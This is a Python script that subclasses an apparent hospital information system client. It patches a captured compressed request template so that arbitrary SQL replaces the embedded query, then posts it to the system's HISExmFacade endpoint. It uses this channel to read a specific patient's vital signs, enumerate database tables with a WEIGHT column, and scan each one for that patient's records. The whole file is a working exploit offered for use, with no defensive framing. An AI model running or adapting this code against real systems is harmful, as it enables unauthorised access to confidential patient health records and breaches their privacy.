from his_client_final import HISClient
import requests
import zlib
import re

class WeightHunter(HISClient):
    def execute_sql(self, sql):
        # print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = WeightHunter()

# 1. Check BP NVALUE2 in VITALSIGNUPLOAD
print("Checking BP 97 details...")
q_bp = f"SELECT * FROM OPDUSR.VITALSIGNUPLOAD WHERE HHISNUM='003617083J' AND NVALUE1=97"
r_bp = hunter.execute_sql(q_bp)
if r_bp and "<NewDataSet>" in r_bp:
    print(r_bp[:2000]) # Check NVALUE2

# 2. Search for WEIGHT tables
print("\nSearching tables with WEIGHT column...")
# Short SQL: < 115 chars
sql = "SELECT OWNER,TABLE_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME='WEIGHT' AND ROWNUM<50"

res = hunter.execute_sql(sql)

candidates = []

if res and "<NewDataSet>" in res:
    matches = re.findall(r'<OWNER>(.*?)</OWNER>\s*<TABLE_NAME>(.*?)</TABLE_NAME>', res)

    for owner, table in matches:
        print(f"Candidate: {owner}.{table}")
        candidates.append(f"{owner}.{table}")
        
    print(f"\nScanning {len(candidates)} candidates for 49.1...")
    
    for table in candidates:
        if "MDRVTSN" in table: continue # Known fail
        
        q = f"SELECT * FROM {table} WHERE HHISNUM = '003617083J'"
        # optimization: check if we can select
        r = hunter.execute_sql(q)
        if r and "<NewDataSet>" in r:
             if "49.1" in r:
                 print(f"!!! FOUND 49.1 IN {table} !!!")
                 print(r[:1000])
